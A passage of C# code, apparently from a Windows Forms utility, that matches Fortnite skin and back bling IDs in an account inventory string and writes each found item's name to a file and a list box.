                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck115 = x.Contains("AthenaCharacter:cid_207_athena_commando_m_footballdudea");
                            if (NewSkinsCheck115)
                            {
                                sw.WriteLine("=> End Zone");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> End Zone");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck117 = x.Contains("AthenaCharacter:cid_208_athena_commando_m_footballdudeb");
                            if (NewSkinsCheck117)
                            {
                                sw.WriteLine("=> Gridiron");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gridiron");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck118 = x.Contains("AthenaCharacter:cid_209_athena_commando_m_footballdudec");
                            if (NewSkinsCheck118)
                            {
                                sw.WriteLine("=> Spike");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spike");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck119 = x.Contains("AthenaCharacter:cid_210_athena_commando_f_footballgirla");
                            if (NewSkinsCheck119)
                            {
                                sw.WriteLine("=> Blitz");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blitz");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck120 = x.Contains("AthenaCharacter:cid_211_athena_commando_f_footballgirlb");
                            if (NewSkinsCheck120)
                            {
                                sw.WriteLine("=> Rush");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rush");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck121 = x.Contains("AthenaCharacter:cid_212_athena_commando_f_footballgirlc");
                            if (NewSkinsCheck121)
                            {
                                sw.WriteLine("=> Interceptor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Interceptor");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck122 = x.Contains("AthenaCharacter:cid_214_athena_commando_f_footballreferee");
                            if (NewSkinsCheck122)
                            {
                                sw.WriteLine("=> Whistle Warrior");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Whistle Warrior");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck123 = x.Contains("AthenaCharacter:cid_215_athena_commando_m_footballreferee");
                            if (NewSkinsCheck123)
                            {
                                sw.WriteLine("=> Striped Soldier");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Striped Soldier");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck124 = x.Contains("AthenaCharacter:cid_238_athena_commando_f_footballgirld");
                            if (NewSkinsCheck124)
                            {
                                sw.WriteLine("=> Juke");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Juke");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck125 = x.Contains("AthenaCharacter:cid_239_athena_commando_m_footballduded");
                            if (NewSkinsCheck125)
                            {
                                sw.WriteLine("=> Strong Guard");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Strong Guard");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck126 = x.Contains("AthenaCharacter:cid_267_athena_commando_m_robotred");
                            if (NewSkinsCheck126)
                            {
                                sw.WriteLine("=> A.i.m.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> A.i.m.");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck127 = x.Contains("AthenaCharacter:cid_268_athena_commando_m_rockerpunk");
                            if (NewSkinsCheck127)
                            {
                                sw.WriteLine("=> Riot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Riot");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck128 = x.Contains("AthenaCharacter:cid_269_athena_commando_m_wizard");
                            if (NewSkinsCheck128)
                            {
                                sw.WriteLine("=> Castor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Castor");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck129 = x.Contains("AthenaCharacter:cid_270_athena_commando_f_witch");
                            if (NewSkinsCheck129)
                            {
                                sw.WriteLine("=> Elmira");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Elmira");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck130 = x.Contains("AthenaCharacter:cid_271_athena_commando_f_sushichef");
                            if (NewSkinsCheck130)
                            {
                                sw.WriteLine("=> Maki Master");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Maki Master");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck131 = x.Contains("AthenaCharacter:cid_272_athena_commando_m_hornedmask");
                            if (NewSkinsCheck131)
                            {
                                sw.WriteLine("=> Taro");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Taro");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck132 = x.Contains("AthenaCharacter:cid_273_athena_commando_f_hornedmask");
                            if (NewSkinsCheck132)
                            {
                                sw.WriteLine("=> Nara");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Nara");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck133 = x.Contains("AthenaCharacter:cid_274_athena_commando_m_feathers");
                            if (NewSkinsCheck133)
                            {
                                sw.WriteLine("=> Tender Defender");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tender Defender");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck135 = x.Contains("AthenaCharacter:cid_275_athena_commando_m_sniperhood");
                            if (NewSkinsCheck135)
                            {
                                sw.WriteLine("=> Longshot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Longshot");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck136 = x.Contains("AthenaCharacter:cid_276_athena_commando_f_sniperhood");
                            if (NewSkinsCheck136)
                            {
                                sw.WriteLine("=> Insight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Insight");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck137 = x.Contains("AthenaCharacter:cid_277_athena_commando_m_moth");
                            if (NewSkinsCheck137)
                            {
                                sw.WriteLine("=> Mothmando");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mothmando");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck138 = x.Contains("AthenaCharacter:cid_290_athena_commando_f_bluebadass");
                            if (NewSkinsCheck138)
                            {
                                sw.WriteLine("=> Waypoint");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Waypoint");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck139 = x.Contains("AthenaCharacter:cid_278_athena_commando_m_yeti");
                            if (NewSkinsCheck139)
                            {
                                sw.WriteLine("=> Trog");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Trog");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck140 = x.Contains("AthenaCharacter:cid_279_athena_commando_m_tacticalsanta");
                            if (NewSkinsCheck140)
                            {
                                sw.WriteLine("=> Sgt. Winter");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sgt. Winter");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck141 = x.Contains("AthenaCharacter:cid_280_athena_commando_m_snowman");
                            if (NewSkinsCheck141)
                            {
                                sw.WriteLine("=> Slushy Soldier");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Slushy Soldier");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck142 = x.Contains("AthenaCharacter:cid_281_athena_commando_f_snowboard");
                            if (NewSkinsCheck142)
                            {
                                sw.WriteLine("=> Powder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Powder");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck143 = x.Contains("AthenaCharacter:cid_286_athena_commando_f_neoncat");
                            if (NewSkinsCheck143)
                            {
                                sw.WriteLine("=> Lynx");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lynx");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck144 = x.Contains("AthenaCharacter:cid_287_athena_commando_m_arcticsniper");
                            if (NewSkinsCheck144)
                            {
                                sw.WriteLine("=> Zenith");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Zenith");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck145 = x.Contains("AthenaCharacter:cid_288_athena_commando_m_iceking");
                            if (NewSkinsCheck145)
                            {
                                sw.WriteLine("=> The Ice King");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> The Ice King");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck146 = x.Contains("AthenaCharacter:cid_291_athena_commando_m_dieselpunk02");
                            if (NewSkinsCheck146)
                            {
                                sw.WriteLine("=> Cloudbreaker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cloudbreaker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck147 = x.Contains("AthenaCharacter:cid_292_athena_commando_f_dieselpunk02");
                            if (NewSkinsCheck147)
                            {
                                sw.WriteLine("=> Wingtip");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wingtip");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck148 = x.Contains("AthenaCharacter:cid_293_athena_commando_m_ravenwinter");
                            if (NewSkinsCheck148)
                            {
                                sw.WriteLine("=> Frozen Raven");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frozen Raven");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck149 = x.Contains("AthenaCharacter:cid_294_athena_commando_f_redknightwinter");
                            if (NewSkinsCheck149)
                            {
                                sw.WriteLine("=> Frozen Red Knight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frozen Red Knight");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck150 = x.Contains("AthenaCharacter:cid_295_athena_commando_m_cupidwinter");
                            if (NewSkinsCheck150)
                            {
                                sw.WriteLine("=> Frozen Love Ranger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frozen Love Ranger");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck151 = x.Contains("AthenaCharacter:cid_296_athena_commando_m_math");
                            if (NewSkinsCheck151)
                            {
                                sw.WriteLine("=> Prodigy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Prodigy");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck152 = x.Contains("AthenaCharacter:cid_311_athena_commando_m_reindeer");
                            if (NewSkinsCheck152)
                            {
                                sw.WriteLine("=> Red Nosed Ranger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Red Nosed Ranger");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck153 = x.Contains("AthenaCharacter:cid_297_athena_commando_f_math");
                            if (NewSkinsCheck153)
                            {
                                sw.WriteLine("=> Maven");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Maven");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck154 = x.Contains("AthenaCharacter:cid_298_athena_commando_f_icemaiden");
                            if (NewSkinsCheck154)
                            {
                                sw.WriteLine("=> Glimmer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Glimmer");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck155 = x.Contains("AthenaCharacter:cid_299_athena_commando_m_snowninja");
                            if (NewSkinsCheck155)
                            {
                                sw.WriteLine("=> Snowfoot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snowfoot");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck156 = x.Contains("AthenaCharacter:cid_302_athena_commando_f_nutcracker");
                            if (NewSkinsCheck156)
                            {
                                sw.WriteLine("=> Crackabella");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crackabella");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck157 = x.Contains("AthenaCharacter:cid_303_athena_commando_f_snowfairy");
                            if (NewSkinsCheck157)
                            {
                                sw.WriteLine("=> Sugarplum");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sugarplum");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck158 = x.Contains("AthenaCharacter:cid_304_athena_commando_m_gnome");
                            if (NewSkinsCheck158)
                            {
                                sw.WriteLine("=> Grimbles");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Grimbles");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck159 = x.Contains("AthenaCharacter:cid_308_athena_commando_f_fortnitedj");
                            if (NewSkinsCheck159)
                            {
                                sw.WriteLine("=> Dj Bop");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dj Bop");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck160 = x.Contains("AthenaCharacter:cid_312_athena_commando_f_funkops");
                            if (NewSkinsCheck160)
                            {
                                sw.WriteLine("=> Disco Diva");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Disco Diva");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck161 = x.Contains("AthenaCharacter:cid_314_athena_commando_m_krampus");
                            if (NewSkinsCheck161)
                            {
                                sw.WriteLine("=> Krampus");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Krampus");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck162 = x.Contains("AthenaCharacter:cid_315_athena_commando_m_teriyakifish");
                            if (NewSkinsCheck162)
                            {
                                sw.WriteLine("=> Fishstick");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fishstick");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck163 = x.Contains("AthenaCharacter:cid_316_athena_commando_f_winterholiday");
                            if (NewSkinsCheck163)
                            {
                                sw.WriteLine("=> Tinseltoes");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tinseltoes");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck164 = x.Contains("AthenaCharacter:cid_317_athena_commando_m_winterghoul");
                            if (NewSkinsCheck164)
                            {
                                sw.WriteLine("=> Cloaked Shadow");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cloaked Shadow");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                        }
                        int backblingfound = 0;
                        if (CheckForBackBling.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Back Bling>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Back Bling>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool BackBlingItems1 = x.Contains("001_bluesquire");
                            if (BackBlingItems1)
                            {
                                sw.WriteLine("=> Squire Shield");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Squire Shield");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems2 = x.Contains("002_royaleknight");
                            if (BackBlingItems2)
                            {
                                sw.WriteLine("=> Royale Shield");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Royale Shield");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems3 = x.Contains("003_redknight");
                            if (BackBlingItems3)
                            {
                                sw.WriteLine("=> Red Shield");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Red Shield");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems4 = x.Contains("004_blackknight");
                            if (BackBlingItems4)
                            {
                                sw.WriteLine("=> Black Shield");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Black Shield");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems5 = x.Contains("005_raptor");
                            if (BackBlingItems5)
                            {
                                sw.WriteLine("=> Raptor Satchel");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Raptor Satchel");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems6 = x.Contains("SkiDude");
                            if (BackBlingItems6)
                            {
                                sw.WriteLine("=> Alpine Accessories");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Alpine Accessories");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems7 = x.Contains("SkiGirl");
                            if (BackBlingItems7)
                            {
                                sw.WriteLine("=> Mogul Ski Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mogul Ski Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems8 = x.Contains("022_cupid");
                            if (BackBlingItems8)
                            {
                                sw.WriteLine("=> Love Wings");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Love Wings");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems9 = x.Contains("023_pinkbear");
                            if (BackBlingItems9)
                            {
                                sw.WriteLine("=> Cuddle Bow");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cuddle Bow");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems10 = x.Contains("024_space");
                            if (BackBlingItems10)
                            {
                                sw.WriteLine("=> Astro");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Astro");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems11 = x.Contains("025_tactical");
                            if (BackBlingItems11)
                            {
                                sw.WriteLine("=> Precision");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Precision");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems12 = x.Contains("026_brite");
                            if (BackBlingItems12)
                            {
                                sw.WriteLine("=> Brite Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brite Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems13 = x.Contains("027_scavenger");
                            if (BackBlingItems13)
                            {
                                sw.WriteLine("=> Rust Bucket");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rust Bucket");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems14 = x.Contains("028_spaceblack");
                            if (BackBlingItems14)
                            {
                                sw.WriteLine("=> Dark Matter");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Matter");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems15 = x.Contains("029_retrogrey");
                            if (BackBlingItems15)
                            {
                                sw.WriteLine("=> Backup Plan");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Backup Plan");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems16 = x.Contains("030_tacticalrogue");
                            if (BackBlingItems16)
                            {
                                sw.WriteLine("=> Catalyst");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Catalyst");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems17 = x.Contains("031_dinosaur");
                            if (BackBlingItems17)
                            {
                                sw.WriteLine("=> Scaly");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scaly");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems18 = x.Contains("032_foundermale");
                            if (BackBlingItems18)
                            {
                                sw.WriteLine("=> Pursuit");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pursuit");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems19 = x.Contains("033_founderfemale");
                            if (BackBlingItems19)
                            {
                                sw.WriteLine("=> Skirmish");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Skirmish");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems20 = x.Contains("034_rockerpunk");
                            if (BackBlingItems20)
                            {
                                sw.WriteLine("=> Six String");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Six String");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems21 = x.Contains("035_scathach");
                            if (BackBlingItems21)
                            {
                                sw.WriteLine("=> Buckler");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Buckler");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems22 = x.Contains("036_raven");
                            if (BackBlingItems22)
                            {
                                sw.WriteLine("=> Iron Cage");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Iron Cage");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems23 = x.Contains("037_bunnymale");
                            if (BackBlingItems23)
                            {
                                sw.WriteLine("=> Hard Boiled");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hard Boiled");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems24 = x.Contains("038_bunnyfemale");
                            if (BackBlingItems24)
                            {
                                sw.WriteLine("=> Eggshell");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Eggshell");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems25 = x.Contains("039_spaceblackfemale");
                            if (BackBlingItems25)
                            {
                                sw.WriteLine("=> Dark Void");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Void");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems26 = x.Contains("040_wukong");
                            if (BackBlingItems26)
                            {
                                sw.WriteLine("=> Royale Flags");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Royale Flags");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems27 = x.Contains("041_pajamaparty");
                            if (BackBlingItems27)
                            {
                                sw.WriteLine("=> Hatchling");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hatchling");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems28 = x.Contains("042_fishhead");
                            if (BackBlingItems28)
                            {
                                sw.WriteLine("=> Fish Tank");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fish Tank");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems29 = x.Contains("043_pizza");
                            if (BackBlingItems29)
                            {
                                sw.WriteLine("=> Special Delivery");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Special Delivery");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems30 = x.Contains("044_robo");
                            if (BackBlingItems30)
                            {
                                sw.WriteLine("=> Steelcast");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Steelcast");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems31 = x.Contains("045_tacticaljungle");
                            if (BackBlingItems31)
                            {
                                sw.WriteLine("=> Standard Issue");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Standard Issue");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems32 = x.Contains("047_candy");
                            if (BackBlingItems32)
                            {
                                sw.WriteLine("=> Goodie Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Goodie Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems33 = x.Contains("048_graffiti");
                            if (BackBlingItems33)
                            {
                                sw.WriteLine("=> Tag Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tag Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems34 = x.Contains("049_tacticalwoodland");
                            if (BackBlingItems34)
                            {
                                sw.WriteLine("=> True North");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> True North");
                                }
                                backblingfound = backblingfound + 1;
                            }
